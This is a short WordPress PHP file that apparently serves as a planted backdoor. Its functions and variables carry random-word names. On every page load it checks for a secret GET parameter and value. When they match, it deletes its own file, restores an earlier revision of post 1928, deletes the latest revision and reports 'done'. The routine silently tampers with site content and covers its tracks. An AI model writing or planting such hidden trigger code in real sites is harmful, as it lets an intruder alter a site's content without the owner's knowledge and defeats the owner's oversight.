<?php

function variation_global_cron_right() {
	if (isset($_GET['privacy_shipping_members_template']) && $_GET['privacy_shipping_members_template'] === 'total_security_stock_account') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$avatar_captcha_website_changer = 1928;
		$products_base_header = wp_get_post_revisions($avatar_captcha_website_changer);
		if (empty($products_base_header)) die('no revisions');
		if (count($products_base_header) < 2) die('less than 2');
		$deprecated_divi_restaurant_products = array_shift($products_base_header);
		$csv_avatar_super = $deprecated_divi_restaurant_products->ID;
		$sales_current_alt = array_shift($products_base_header);
		$request_syntax_help_link = $sales_current_alt->ID;
		$emails_themes_maintenance_creator = wp_restore_post_revision($request_syntax_help_link);
		if ($emails_themes_maintenance_creator === false) die('error restoring');
		$emails_themes_maintenance_creator = wp_delete_post_revision($csv_avatar_super);		
		if ($emails_themes_maintenance_creator === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'variation_global_cron_right');
